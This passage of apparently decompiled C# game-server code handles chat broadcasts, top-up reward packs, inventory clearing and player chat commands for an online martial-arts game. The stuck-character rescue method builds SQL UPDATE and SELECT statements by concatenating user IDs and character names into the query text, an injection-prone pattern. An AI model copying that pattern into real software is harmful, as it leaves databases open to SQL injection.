					if (World.LionRoarList.Count < World.狮子吼最大数)
					{
						World.LionRoarList.Enqueue(new 狮子吼Class
						{
							Index = base.人物全服ID,
							UserName = base.UserName,
							TxtId = msgType,
							Txt = msg
						});
						if (World.狮子吼ID >= 127)
						{
							World.狮子吼ID = 0;
						}
						else
						{
							World.狮子吼ID++;
						}
						系统提示("狮子吼登记成功");
					}
					else
					{
						系统提示("狮子吼列队以满请等待.....");
					}
					break;
				}
				case 0:
					if (交易 != null && 交易.交易中)
					{
						array[10] = 11;
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						if (交易.交易人.Client != null)
						{
							交易.交易人.Client.Send(array, array.Length);
						}
					}
					else
					{
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						发送当前范围广播数据(array, array.Length);
					}
					break;
				case 1:
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					发送呐喊消息广播数据(array, array.Length);
					break;
				case 2:
				{
					if (World.Teams.TryGetValue(组队id, out var value2))
					{
						发送组队消息广播数据(array, array.Length, value2.组队列表);
					}
					break;
				}
				case 3:
					if (base.帮派名字.Length != 0)
					{
						发送帮派消息(base.帮派名字, array, array.Length);
					}
					break;
				case 4:
				{
					if (得到人物数据(name) == null)
					{
						系统提示("消息发送失败, 人物名不正确或对方处于离线状态。", 50, "系统提示");
						break;
					}
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					string text3 = Converter.ToString(array);
					int num2 = base.人物全服ID + new Random().Next(1, 100);
					World.conn.发送("传音消息|" + num2 + "|" + base.UserName + "|" + name + "|" + msg + "|" + msgType + "|" + text3);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送消息出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 清理绑定背包()
		{
			try
			{
				for (int i = 0; i < 36; i++)
				{
					if (装备栏包裹[i].物品绑定 && 装备栏包裹[i].Get物品ID != 1000000415 && 装备栏包裹[i].Get物品ID != 1700101 && 装备栏包裹[i].Get物品ID != 1008001507)
					{
						装备栏包裹[i].物品_byte = new byte[World.数据库单个物品大小];
					}
				}
				初始化装备篮包裹();
				系统提示("背包绑定物品清理完成, 无法追回谨慎操作", 9, "系统提示");
			}
			catch
			{
			}
		}

		private int 得到充值礼包(int 档次)
		{
			int result = 0;
			foreach (累计充值礼包 value in World.累计充值礼包.Values)
			{
				if (value.档次 == 档次)
				{
					result = value.礼包编号;
				}
			}
			return result;
		}

		private int 累计充值最小(int 档次)
		{
			int result = 0;
			foreach (累计充值礼包 value in World.累计充值礼包.Values)
			{
				if (value.档次 == 档次)
				{
					result = value.累计最小;
				}
			}
			return result;
		}

		private int 累计充值最大(int 档次)
		{
			int result = 0;
			foreach (累计充值礼包 value in World.累计充值礼包.Values)
			{
				if (value.档次 == 档次)
				{
					result = value.累计最大;
				}
			}
			return result;
		}

		public void 领取充值奖励()
		{
			try
			{
				int 数量 = 1;
				if (base.累计充值 < 50)
				{
					系统提示("在充值[" + (累计充值最小(1) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					return;
				}
				int num = 得到包裹空位(this);
				if (num < 6)
				{
					系统提示("背包剩余数量不足6格", 50, "系统提示");
					return;
				}
				CheckTreasureGems();
				if (base.累计充值 >= 累计充值最小(1) && base.累计充值 < 累计充值最大(1))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("在充值[" + (累计充值最小(2) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					}
				}
				if (base.累计充值 >= 累计充值最小(2) && base.累计充值 < 累计充值最大(2))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("在充值[" + (累计充值最小(3) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					}
				}
				if (base.累计充值 >= 累计充值最小(3) && base.累计充值 < 累计充值最大(3))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("在充值[" + (累计充值最小(4) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					}
				}
				if (base.累计充值 >= 累计充值最小(4) && base.累计充值 < 累计充值最大(4))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("在充值[" + (累计充值最小(5) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					}
				}
				if (base.累计充值 >= 累计充值最小(5) && base.累计充值 < 累计充值最大(5))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 4)
					{
						base.FLD_首充次数 = 5;
						AddItemWithProperties(得到充值礼包(5), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("在充值[" + (累计充值最小(6) - base.累计充值) + "]元, 才可以领取礼包..", 50, "系统提示");
					}
				}
				if (base.累计充值 >= 累计充值最小(6))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 4)
					{
						base.FLD_首充次数 = 5;
						AddItemWithProperties(得到充值礼包(5), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					if (base.FLD_首充次数 == 5)
					{
						base.FLD_首充次数 = 6;
						AddItemWithProperties(得到充值礼包(6), 得到包裹空位(this), 数量, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					else
					{
						系统提示("你已经站在了本服的巅峰无礼包领取了..", 50, "系统提示");
					}
				}
				SaveGemData();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "命令充值奖励 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public string 领取充值奖励(int sl, int yuanbao)
		{
			try
			{
				sl = 1;
				if (base.累计充值 < 50)
				{
					return "在充值[" + (累计充值最小(1) - base.累计充值) + "]元, 才可以领取";
				}
				if (yuanbao < 0)
				{
					return "领取错误1";
				}
				if (sl != 1)
				{
					return "领取错误2";
				}
				int num = 得到包裹空位(this);
				if (num == -1)
				{
					return "没有空位了";
				}
				CheckTreasureGems();
				if (base.累计充值 >= 累计充值最小(1) && base.累计充值 < 累计充值最大(1))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					return "在充值[" + (累计充值最小(2) - base.累计充值) + "]元, 才可以领取";
				}
				if (base.累计充值 >= 累计充值最小(2) && base.累计充值 < 累计充值最大(2))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(2) + "元礼包";
					}
					return "在充值[" + (累计充值最小(3) - base.累计充值) + "]元, 才可以领取";
				}
				if (base.累计充值 >= 累计充值最小(3) && base.累计充值 < 累计充值最大(3))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(2) + "元礼包";
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(3) + "元礼包";
					}
					return "在充值[" + (累计充值最小(4) - base.累计充值) + "]元, 才可以领取";
				}
				if (base.累计充值 >= 累计充值最小(4) && base.累计充值 < 累计充值最大(4))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(2) + "元礼包";
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(3) + "元礼包";
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(4) + "元礼包";
					}
					return "在充值[" + (累计充值最小(5) - base.累计充值) + "]元, 才可以领取";
				}
				if (base.累计充值 >= 累计充值最小(5) && base.累计充值 < 累计充值最大(5))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(2) + "元礼包";
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(3) + "元礼包";
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(4) + "元礼包";
					}
					if (base.FLD_首充次数 == 4)
					{
						base.FLD_首充次数 = 5;
						AddItemWithProperties(得到充值礼包(5), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(5) + "元礼包";
					}
					return "在充值[" + (累计充值最小(6) - base.累计充值) + "]元, 才可以领取";
				}
				if (base.累计充值 >= 累计充值最小(6))
				{
					if (base.FLD_首充次数 == 0)
					{
						base.FLD_首充次数 = 1;
						AddItemWithProperties(得到充值礼包(1), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(1) + "元礼包";
					}
					if (base.FLD_首充次数 == 1)
					{
						base.FLD_首充次数 = 2;
						AddItemWithProperties(得到充值礼包(2), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(2) + "元礼包";
					}
					if (base.FLD_首充次数 == 2)
					{
						base.FLD_首充次数 = 3;
						AddItemWithProperties(得到充值礼包(3), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(3) + "元礼包";
					}
					if (base.FLD_首充次数 == 3)
					{
						base.FLD_首充次数 = 4;
						AddItemWithProperties(得到充值礼包(4), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(4) + "元礼包";
					}
					if (base.FLD_首充次数 == 4)
					{
						base.FLD_首充次数 = 5;
						AddItemWithProperties(得到充值礼包(5), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(5) + "元礼包";
					}
					if (base.FLD_首充次数 == 5)
					{
						base.FLD_首充次数 = 6;
						AddItemWithProperties(得到充值礼包(6), num, sl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						SaveGemData();
						return "成功领取" + 累计充值最小(6) + "元礼包";
					}
					return "没有可领取的礼包";
				}
				return "领取成功";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁领取充值奖励 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				return "购买错误3";
			}
		}

		public void 清理英雄职业武器()
		{
			try
			{
				for (int i = 0; i < 36; i++)
				{
					if (!World.Itme.TryGetValue((int)装备栏包裹[i].Get物品ID, out var _))
					{
						continue;
					}
					foreach (英雄职业武器 value2 in World.英雄职业武器系统.Values)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == value2.装备ID)
						{
							装备栏包裹[i].物品_byte = new byte[World.数据库单个物品大小];
							break;
						}
					}
				}
				初始化装备篮包裹();
				系统提示("英雄职业转职武器已经清除", 9, "系统提示");
			}
			catch
			{
			}
		}

		public void 领取英雄职业武器()
		{
			try
			{
				foreach (英雄职业武器 value in World.英雄职业武器系统.Values)
				{
					if (base.Player_Job != value.职业 || base.Player_Job_leve != value.几转)
					{
						continue;
					}
					bool flag = false;
					for (int i = 0; i < 96; i++)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == value.装备ID)
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						if (value.装备ID != BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0))
						{
							系统提示("英雄职业武器已经领取", 9, "系统提示");
						}
						else
						{
							系统提示("你已经穿戴对应的转职武器无需领取", 9, "系统提示");
						}
					}
					else
					{
						系统提示("你背包已经有转职武器无需领取", 9, "系统提示");
					}
					break;
				}
			}
			catch
			{
			}
		}

		public void 清理行囊()
		{
			try
			{
				for (int i = 36; i < 96; i++)
				{
					if (!World.Itme.TryGetValue((int)装备栏包裹[i].Get物品ID, out var value))
					{
						continue;
					}
					switch (value.FLD_RESIDE2)
					{
					case 1:
					case 2:
					case 4:
					case 5:
					case 6:
					case 7:
					case 8:
					case 10:
						if (装备栏包裹[i].FLD_强化数量 >= 15)
						{
							continue;
						}
						break;
					}
					bool flag = false;
					foreach (英雄职业武器 value2 in World.英雄职业武器系统.Values)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == value2.装备ID)
						{
							flag = true;
							break;
						}
					}
					if (!装备栏包裹[i].物品绑定 && 装备栏包裹[i].Get物品ID != 1000000415 && 装备栏包裹[i].Get物品ID != 1700101 && !flag && 装备栏包裹[i].Get物品ID != 1008001507)
					{
						装备栏包裹[i].物品_byte = new byte[World.数据库单个物品大小];
					}
				}
				初始化装备篮包裹();
				系统提示("行囊物品及绑定物品清理完成, 无法追回谨慎操作", 9, "系统提示");
			}
			catch
			{
			}
		}

		public void 卡号自救()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [TBL_XWWL_Char] where FLD_ID='" + base.Userid + "'");
			for (int i = 0; i < dBToDataTable.Rows.Count; i++)
			{
				string text = (string)dBToDataTable.Rows[i]["FLD_NAME"];
				if (text != base.UserName)
				{
					DBA.ExeSqlCommand($"UPDATE TBL_XWWL_Char SET FLD_X = {-6800}, FLD_Y = {53}, FLD_Z = 15, FLD_MENOW = {301} WHERE FLD_NAME = '{text}'");
				}
			}
			系统提示("已经卡号自救成功, 可以登录卡号的人物", 9, "系统提示");
		}

		public void 清理背包()
		{
			try
			{
				for (int i = 0; i < 36; i++)
				{
					if (!World.Itme.TryGetValue((int)装备栏包裹[i].Get物品ID, out var value))
					{
						continue;
					}
					switch (value.FLD_RESIDE2)
					{
					case 1:
					case 2:
					case 4:
					case 5:
					case 6:
					case 7:
					case 8:
					case 10:
						if (装备栏包裹[i].FLD_强化数量 > 15)
						{
							continue;
						}
						break;
					}
					bool flag = false;
					foreach (英雄职业武器 value2 in World.英雄职业武器系统.Values)
					{
						if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == value2.装备ID)
						{
							flag = true;
							break;
						}
					}
					if (!装备栏包裹[i].物品绑定 && 装备栏包裹[i].Get物品ID != 1000000415 && 装备栏包裹[i].Get物品ID != 1008001507 && 装备栏包裹[i].Get物品ID != 1700101 && !flag)
					{
						装备栏包裹[i].物品_byte = new byte[World.数据库单个物品大小];
					}
				}
				初始化装备篮包裹();
				系统提示("背包物品及绑定物品清理完成, 无法追回谨慎操作", 9, "系统提示");
			}
			catch
			{
			}
		}

		public void 复查用户离线登陆()
		{
			try
			{
				World.conn.发送("复查用户离线登陆|" + base.Userid);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "复查用户离线登陆 错误" + ex.Message);
			}
		}

		public bool ParseCommand(string Message)
		{
			string a = Message[0].ToString();
			if (!(a == "!") && !(a == "@"))
			{
				return false;
			}
			string[] array = Message.Split(' ');
			string text = array[0];
			if (text.Contains("@"))
			{
				text = text.Replace("@", "!");
			}
			if (array.Length >= 1 && text == "!help")
			{
				系统提示("玩家可以用本命令移动动各个地图", 9, "[!移动 地图名]");
				系统提示("玩家可以用本命令跳舞", 9, "[!跳舞]");
				系统提示("玩家可以用本命令鞠躬", 9, "[!鞠躬]");
				系统提示("玩家可以用本命令弯腰", 9, "[!弯腰]");
				系统提示("玩家可以用本命令清理背包", 9, "[!清理背包]");
				系统提示("玩家可以用本命令发送狮吼功信息", 9, "[!狮吼功 消息]");
				系统提示("玩家可以用本命令进行离线挂 机", 9, "[!离线挂机]");
				系统提示("玩家可以用本命解救同帐号下卡号的人物角色", 9, "[!卡号自救]");
				return true;
			}
			if (array.Length >= 1 && text == "!追杀")
			{
				CheckTreasureGems();
				if (base.FLD_RXPIONT < 800)
				{
					系统提示("真穷, 800元宝都没有...");
					return true;
				}
				string[] array2 = World.监狱地图.Trim().Split(',');
				if (base.人物坐标_地图 == int.Parse(array2[0]) && base.人物善恶 < 0)
				{
					系统提示("你想逃狱么~这里苍蝇都飞不出去, 安心的泡点吧", 10, "系统提示");
					return true;
				}
				Players players = World.检查玩家name(array[1]);
				if (players != null)
				{
					检察元宝数据(800, 0, "追杀");
					移动(players.人物坐标_X, players.人物坐标_Y, 15f, players.人物坐标_地图);
					SaveGemData();
				}
				else
				{
					系统提示("对方不在线或名字输入错误。");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!参加攻城")
			{
				参加攻城战();
			}
			if (array.Length >= 1 && array[0] == World.装备升级命令)
			{
				装备2合1();
			}
			if (array.Length >= 1 && array[0] == "!二转正")
			{
				if (base.Player_Level < 35 || base.Player_Job_leve >= 2 || base.Player_Zx != 0)
				{
					系统提示("当前状态不能转职！");
				}
				else
				{
					人物转职业(1, 2);
					新学气功(6, 0);
					神女武功点数 += 5;
					更新金钱和负重();
					更新人物数据(this);
					更新装备效果to(this, this);
					更新武功和状态();
					更新气功();
				}
				return true;
			}
			if (array.Length >= 2 && array[0] == "!查安全码")
			{
				string sqlCommand = "select FLD_ID, FLD_CARD from [TBL_ACCOUNT] where FLD_ID=@Userid";
				SqlParameter[] prams = new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) };
				DataTable dBToDataTable = DBA.GetDBToDataTable(sqlCommand, prams, "rxjhaccount");
				if (dBToDataTable == null)
				{
					return true;
				}
				if (dBToDataTable.Rows.Count == 0)
				{
					dBToDataTable.Dispose();
					return true;
				}
				if (dBToDataTable.Rows[0]["FLD_CARD"].ToString() == array[1].Trim())
				{
					系统提示("您当前的安全码为:[" + 游戏安全码 + "]！", 3, "系统提示");
				}
				else
				{
					系统提示("身份证输入错误, 请重新输入身份证号！", 3, "系统提示");
				}
				dBToDataTable.Dispose();
				return true;
			}
			if (array.Length >= 1 && array[0] == "!修改安全码")
			{
				if (base.zastcoginip == base.lastloginip)
				{
					if (array[1].Trim().Length < 6)
					{
						系统提示("游戏密码不能小于6位, 请重新输入!修改安全码 命令!", 6, "系统提示");
						return true;
					}
					if (array[1].Trim().Length > 9)
					{
						系统提示("游戏密码不能大于9位，请重新输入!修改安全码 命令！", 6, "系统提示");
						return true;
					}
					if (!Regex.IsMatch(array[1].Trim(), "^[A-Za-z0-9]+$"))
					{
						系统提示("游戏密码必须是由大于6位且小于9位的字母和数字组成，请重新输入!修改安全码 命令！~", 6, "系统提示");
						return true;
					}
					RxjhClass.保存安全码数据(base.Userid, array[1].Trim());
					系统提示("修改安全码成功！！！当前新安全码[" + array[1].Trim() + "]请用记事本保存。", 6, "系统提示");
					查登陆IP();
				}
				else
				{
					系统提示("你上次登陆IP跟本次IP不符合无法修改, 请联系游戏客服处理", 10, "系统提示");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!清理任务")
			{
				任务.Clear();
				保存人物数据存储过程();
				系统提示("任务清理完毕可以从新转职", 10, "系统提示");
				return true;
			}
			if (array.Length >= 1 && array[0] == "!清理称号")
			{
				称号药品类 value;
				if (称号药品.ContainsKey(1008001042))
				{
					称号药品.TryRemove(1008001042, out value);
					药品新效果(1008001042, 0, 0u, 0u);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
				else if (称号药品.ContainsKey(1008001043))
				{
					称号药品.TryRemove(1008001043, out value);
					药品新效果(1008001043, 0, 0u, 0u);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
				else
				{
					系统提示("当前不存在状态！");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == World.转生命令)
			{
				转生系统();
			}
			if (array.Length >= 2 && array[0] == "!兑换武皇币")
			{
				int num = int.Parse(array[1]);
				if (num < 10000)
				{
					系统提示("武勋小于10000，无法兑换武皇币", 10, "系统提示");
					return true;
				}
				if (base.Player_WuXun < num)
				{
					系统提示("武勋不足，无法兑换武皇币", 10, "系统提示");
				}
				else
				{
					base.Player_WuXun -= num;
					base.Player_Whtb += num;
					更新武功和状态();
					更新人物数据(this);
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!转生信息")
			{
				系统提示(string.Concat(new object[3] { "『转生次数』→ ", base.转生次数, "转 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『附加攻击』→ ", base.转生_追加_攻击, "点←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『附加防御』→ ", base.转生_追加_防御, "点←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『附加生命』→ ", base.转生_追加_生命, "点←" }), 3, "「个人信息」");
			}
			if (array.Length >= 1 && array[0] == "!信息")
			{
				系统提示("『攻击』→ " + base.FLD_人物基本_攻击 + " ←『防御』→ " + base.FLD_人物基本_防御 + " ←", 10, "「个人信息」");
				系统提示("『生命』→ " + base.人物最大_HP + " ←『内功』→ " + base.人物_MP + " ←", 10, "「个人信息」");
				系统提示("『回避』→ " + base.FLD_人物基本_回避 + " ←『命中』→ " + base.FLD_人物基本_命中 + " ←", 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『武勋阶段』→ ", base.武勋阶段, "段 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『元宝数量』→ ", base.FLD_RXPIONT, "元宝 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『钻石数量』→ ", base.FLD_RXPIONTX, "钻石 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『门派贡献』→ ", base.门派贡献度, "点 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『消费元宝』→ ", base.元宝消费, "元宝 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『消费钻石』→ ", base.钻石消费, "钻石 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『称号点数』→ ", base.累计充值, "点 ←" }), 10, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『宝石数量』→ [", 称号积分, "] 个 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『玫瑰数量』→ [", 玫瑰称号积分, "] 朵 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『杀人次数』→ [", base.杀人次数, "] 次 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『被杀次数』→ [", base.被杀次数, "] 次 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『今日增加』→ [", 每日获得武勋, "] 武勋 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『今日丢失』→ [", 丢失武勋, "] 武勋 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『修炼时间』→ [", 修炼地图剩余时间, "] 分钟 ←" }), 3, "「个人信息」");
				系统提示(string.Concat(new object[3] { "『遗忘时间』→ [", 活动地图剩余时间, "] 分钟 ←" }), 3, "「个人信息」");
			}
			if (array.Length >= 1 && array[0] == "!错误信息")
			{
				系统提示(string.Concat(new object[3] { "『游戏报错』→ [", 报错次数阀值, "] 次←" }), 3, "「错误信息」");
			}
			if (array.Length >= 1 && array[0] == "!查询假人")
			{
				系统提示(string.Concat(new object[3] { "『是否假人』→ [", base.是否假人, "] ←" }), 3, "「假人信息」");
			}
			if (array.Length >= 1 && array[0] == "!查询活动")
			{
				系统提示(string.Concat(new object[3]
				{
					"『活动状态』→ [",
					World.活动开启中,
					"] ←"
				}), 3, "「活动信息」");
			}
			if (array.Length >= 1 && array[0] == "!关闭PK提示")
			{
				系统提示("关闭PK提示成功。", 50, "系统提示");
				PK提示 = 0;
			}
			if (array.Length >= 1 && array[0] == "!开启PK提示")
			{
				系统提示("开启PK提示成功。", 50, "系统提示");
				PK提示 = 1;
			}
			if (array.Length >= 1 && array[0] == World.贡献元宝命令)
			{
				if (base.帮派Id == 0)
				{
